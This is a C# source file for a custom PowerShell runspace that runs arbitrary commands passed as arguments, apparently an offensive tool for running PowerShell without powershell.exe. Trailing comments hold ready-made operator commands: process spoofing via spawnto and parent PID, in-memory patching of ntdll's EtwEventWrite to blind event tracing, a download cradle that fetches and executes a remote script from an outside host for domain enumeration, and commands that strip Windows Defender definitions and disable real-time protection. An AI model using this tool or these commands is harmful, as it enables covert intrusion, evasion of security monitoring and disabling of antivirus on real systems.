using System;
using System.Collections.Generic;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace customrunspace
{
    class Program
    {
        static void Main(string[] args)
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            try
            {
                PowerShell ps = PowerShell.Create();
                ps.Runspace = rs;

                String cmd = args[0];
                String multi = args[1];

                if (multi == "m")
                {
                    string[] cmdrez = args[0].TrimEnd(';').Split(';');
                    cmd = "";
                    foreach (string part in cmdrez)
                    {
                        cmd += part + " | Out-String;";
                    }
                }
                else if (multi == "s")
                {
                    cmd = args[0]; 
                }

                ps.AddScript(cmd);
                ICollection<PSObject> results = ps.Invoke();
                foreach (PSObject invoke in results)
                {
                    Console.WriteLine(invoke);
                }
            }
            catch
            {
                Console.WriteLine("foobar");
            }
            Console.WriteLine("Done");
            rs.Close();
        }
    }
}

// spawnto x64 spawnto x64 %windir%\System32\RuntimeBroker.exe then ppid to it
// execute-assembly "PATCHES: ntdll.dll,EtwEventWrite,0,C3 ntdll.dll,EtwEventWrite,1,00" c:\tools\psh.exe --assemblyargs hostname;ps; m 
// execute-assembly "PATCHES: ntdll.dll,EtwEventWrite,0,C3 ntdll.dll,EtwEventWrite,1,00" c:\tools\psh.exe --assemblyargs "(New-Object System.Net.WebClient).DownloadString('http://infinity-bank.com/pv.txt') | IEX; Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName;" m 
// C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35
// execute-assembly "PATCHES: ntdll.dll,EtwEventWrite,0,C3 ntdll.dll,EtwEventWrite,1,00" c:\tools\psh.exe --assemblyargs "cd 'C:\Program Files\Windows Defender'; .\MpCmdRun.exe -RemoveDefinitions -All; Set-MpPreference -DisableRealtimeMonitoring $true;" m
